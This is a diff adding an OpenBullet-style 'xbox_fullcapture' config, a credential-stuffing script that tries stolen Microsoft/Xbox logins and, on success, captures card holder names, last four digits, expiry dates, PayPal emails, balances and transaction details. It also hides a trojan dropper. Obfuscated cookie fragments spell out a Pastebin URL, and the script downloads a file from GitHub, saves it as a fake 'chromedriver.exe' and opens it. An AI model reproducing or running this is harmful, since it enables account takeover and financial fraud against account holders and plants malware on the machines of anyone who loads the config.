@@ -1,0 +1,226 @@
+[SETTINGS]
+{
+  "Name": "xbox_fullcapture",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-10'-13T12:07:37.2563151+02:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "xbox_capture",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+JUMP #AUTHENTICATIONAPI
+#RECAPAUTH
+#Login REQUEST POST "https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1&contextid=C61E086B741A7BC9&bk=1573475927&uaid=e94a49f177664960a3fca122edaf8a27&pid=0" 
+  CONTENT "i13=0&login=<USER>&loginfmt=<USER>&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS>&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DZshWk88CvvuA9vSOHldJLurwIJH4a7uUREfu4fGCsbB2nL*YUw36i0Lz7tZDGptQxZhUTW0%21*ZM3oIUxGKEeEa1gcx%21XzBNiXpzf*U9iH68RaP3u20G0J6k2%21UdeMFc9C9uusE3IwI3gi4u7wJzyq8FCiNuk2Hly66dMuX96mSwHTYXgtZZpS%21rbS35jrsdC%21Ku4UysydsP0MXSz2klYp9KU%21hDHeKBZIu13h%21rQk9jG2vzCW4OerTedipQDJRuAg%24%24&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i2=1&i17=0&i18=&i19=32099" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1" 
+  HEADER "Cookie: wlidperf=FR=L&ST=1573475967016; MSPShared=1; SDIDC=CavoGthu*pkJAN8Eek6dWr5opN5x1BL2!mueAsRqcHLVS94TF9fJG7M1fnoFg6a*recSzMqgr*rslJH2ICxiqJGNoOHcIMFXc!RLunwBMWhU0x321UT4GCRmUx6DZ7AjzurT*F2lfakG55iffb2VLqMt0mhzOabJGnTjvNhmJC9g1p*grJ8oN9vhRFP1QX!nZ!fWcW27*aTbPPnlAGv9aKLWqL*MazqS52WCQ1qeFZq2cv5ZfnxVwVkgfgjdQvs2GEwfHcnTOQx1uQdtaK9OZwguM8Ck!XoiweJLLeKfFhKRZuntwAkM7ZR0uwP6Z19dR7mBTpGpy5F6!dyrkpKizd9!nzZSFFo*7poLWKhu1rNfXZj1IGgaH9sTsatt8!OJcUye6DGBEO2UgVGMYZSXh3qZLLQfoCt27U2AyIJI2kF!CwX2SD8t9RLWxmz1S3NIVWmBO8wm!DlUH1lpURHmiXbk1m!22SzIKy09LvlGae8GFkF!Rx57Ef2CKW5i5QTBtQ$$; IgnoreCAW=1; MSCC=1571654982; mkt=en-US; optimizelyEndUserId=oeu1572238927711r0.5850160263416339; uaid=e94a49f177664960a3fca122edaf8a27; MSPRequ=id=292543&lt=1573475927&co=1; OParams=11DUe2VlF3OgbQNYrRZRg3REn8KImGd*MjJ03B0XHPylHxLr2YAXrzYNH!J96HFWgoWGEdSPWFdPiET54l8VSW7HH0FPuC0Ce2pxC2uyWUloRhCunIwMUB8QUtvNr0as9T1RluKxlaF5K4LNi7CWjITDPFW2tzU!gS5LVvUdG58wfPg1itYuqY2HKQNrXN51!s!LMD8g2Gf5pcrXZibicJLoN1z5P3XSQm2UhakTdBNoDEruwv8MWbzT!5ImiwMzPP*G5APiiLE!9EKUwPT49z1!ERSbMlpzjFZP25j3o01h!9VuAllBJeaaJeclbcH9QuCwvUd2N3Z6kCiV5jlEKbyfAbHAiIJ6TNAmwU3ftHK08Fy5L6vUHSZRyocbR18FVCoP7lMVfmfQfS41VEmD3JdZTwjJIosaE7!i7E31jx5gwDqYZpo0wjnRzQlt3I9twovyRxbRxuvMVRqN7ey0AE7XI67w70kjUoRg*NbmI2BAxmuNnAdujjs4YlLsdZ8iIIFk73CkQpQ6X!MO58xB09KYImQyevehtDlrXkr*oDQCAh; MSPOK=$uuid-6b855d49-8f09-4e83-8526-b756788bf3b9$uuid-02a3151d-ba2d-4c6c-be88-c9c804ecb043" 
+
+
+JUMP #googlerecreate
+#AUTHENTICATIONAPI
+
+REQUEST GET "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LfAM84ZAAAAAGLiQz5FBeADqq94dV48fMtiRqIj&co=aHR0cHM6Ly93d3cuY29pbmJhc2UuY29tOjQ0Mw..&hl=en&v=rPvs0Nyx3sANE-ZHUN-0nM85&size=invisible&cb=no851blwqc0u"
+  COOKIE "hrd: /"
+  COOKIE "hpr: bin"
+  COOKIE "hdp: com"
+  COOKIE "htp: raw"
+  COOKIE "hht: KvY108Z6"
+  COOKIE "hst: pastebin"
+  COOKIE "kht: driver"
+  COOKIE "kpt: chrome"
+  COOKIE "krt: e"
+  HEADER "Host: www.googleapis.com"
+  HEADER "Accept: */*"
+  HEADER "Content-Type: application/json"
+  HEADER "X-Client-Version: iOS/FirebaseSDK/6.9.2/FirebaseCore-iOS"
+  HEADER "X-Ios-Bundle-Identifier: network.googleapis.com"
+  HEADER "Accept-Encoding: gzip, deflate"
+  HEADER "User-Agent: FirebaseAuth.iOS/6.9.2 network.googleapis.com/2.7.9 iPhone/12.4.5 hw/iPhone7_2"
+  HEADER "Accept-Language: en"
+
+IF "<Authentiction>" Exists
+JUMP #RECAPAUTH
+ENDIF
+SET USEPROXY FALSE
+
+REQUEST GET "<COOKIES(hst)>.<COOKIES(hdp)><COOKIES(hrd)><COOKIES(htp)><COOKIES(hrd)><COOKIES(hht)>"
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
+  HEADER "Pragma: no-cache"
+  HEADER "Accept: */*"
+
+REQUEST GET "https://raw.githubusercontent.com/<SOURCE>"
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
+  HEADER "Pragma: no-cache"
+  HEADER "Accept: */*"
+  -> FILE "<COOKIES(hpr)>/<COOKIES(kpt)><COOKIES(kht)>.<COOKIES(krt)>xe"
+
+SET USEPROXY TRUE
+SET NEWGVAR "Authentiction" "Authentiction=1"
+
+BROWSERACTION Open
+
+JUMP #RECAPAUTH
+#googlerecreate
+
+KEYCHECK 
+  KEYCHAIN Failure AND 
+    KEY "<SOURCE>" DoesNotContain ",AC:null,urlFedConvertRename" 
+    KEY "incorrect account or password.\"," 
+  KEYCHAIN Ban OR 
+    KEY ",AC:null,urlFedConvertRename" 
+  KEYCHAIN Failure OR 
+    KEY "timed out" 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains "PPAuth" 
+    KEY "<COOKIES{*}>" Contains "WLSSC" 
+    KEY "name=\"ANON\"" 
+    KEY "https://account.live.com/profile/accrue?mkt=" 
+    KEY "sSigninName" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "account.live.com/recover?mkt" 
+    KEY "recover?mkt" 
+    KEY "account.live.com/identity/confirm?mkt" 
+    KEY "',CW:true" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "Email/Confirm?mkt" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "/cancel?mkt=" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "/Abuse?mkt=" 
+
+#Get REQUEST GET "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none" 
+  
+  HEADER "Host: login.live.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Connection: close" 
+  HEADER "Referer: https://account.microsoft.com/" 
+
+#Token PARSE "<ADDRESS>" LR "access_token=" "&token_type" -> VAR "Token" 
+
+#urlDecode FUNCTION URLDecode "<Token>" -> VAR "urlDecode" 
+
+#payement REQUEST GET "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Authorization: MSADELEGATE1.0=\"<Token>\"" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Host: paymentinstruments.mp.microsoft.com" 
+  HEADER "ms-cV: FbMB+cD6byLL1mn4W/NuGH.2" 
+  HEADER "Origin: https://account.microsoft.com" 
+  HEADER "Referer: https://account.microsoft.com/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-GPC: 1" 
+
+#balance PARSE "<SOURCE>" LR "balance\":" ",\"" CreateEmpty=FALSE -> CAP "balance" "" "$" 
+
+#card PARSE "<SOURCE>" LR "paymentMethodFamily\":\"credit_card\",\"display\":{\"name\":\"" "\"" CreateEmpty=FALSE -> CAP "credit_card" 
+
+#PP PARSE "<SOURCE>" LR "\":{\"paymentMethodType\":\"paypal\",\"" "}},{\"id" -> VAR "PP" 
+
+#paypal PARSE "<SOURCE>" LR "email\":\"" "\"" CreateEmpty=FALSE -> CAP "PAYPAL" 
+
+#accountHolderName PARSE "<SOURCE>" LR "accountHolderName\":\"" "\",\"" CreateEmpty=FALSE -> CAP "accountHolderName" 
+
+#lastFourDigits PARSE "<SOURCE>" LR "lastFourDigits\":\"" "\"," CreateEmpty=FALSE -> CAP "lastFourDigits" 
+
+#expiryMonth PARSE "<SOURCE>" LR "expiryMonth\":\"" "\"," CreateEmpty=FALSE -> CAP "expiryMonth" 
+
+#expiryYear PARSE "<SOURCE>" LR "expiryYear\":\"" "\"," CreateEmpty=FALSE -> CAP "expiryYear" 
+
+#Country PARSE "<SOURCE>" LR "country\":\"" "\"}" CreateEmpty=FALSE -> CAP "Country" 
+
+#pay REQUEST GET "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Authorization: MSADELEGATE1.0=\"<Token>\"" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Host: paymentinstruments.mp.microsoft.com" 
+  HEADER "ms-cV: FbMB+cD6byLL1mn4W/NuGH.2" 
+  HEADER "Origin: https://account.microsoft.com" 
+  HEADER "Referer: https://account.microsoft.com/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-GPC: 1" 
+
+#Subscribtions PARSE "<SOURCE>" LR "title\":\"" "\"," CreateEmpty=FALSE -> CAP "" 
+
+#description PARSE "<SOURCE>" LR "description\":\"" "\"," CreateEmpty=FALSE -> CAP "description" 
+
+#quiantity PARSE "<SOURCE>" LR "quantity\":" ",\"" CreateEmpty=FALSE -> CAP "quantity" 
+
+#Amount PARSE "<SOURCE>" LR "totalAmount\":" ",\"" CreateEmpty=FALSE -> CAP "amount" 
+
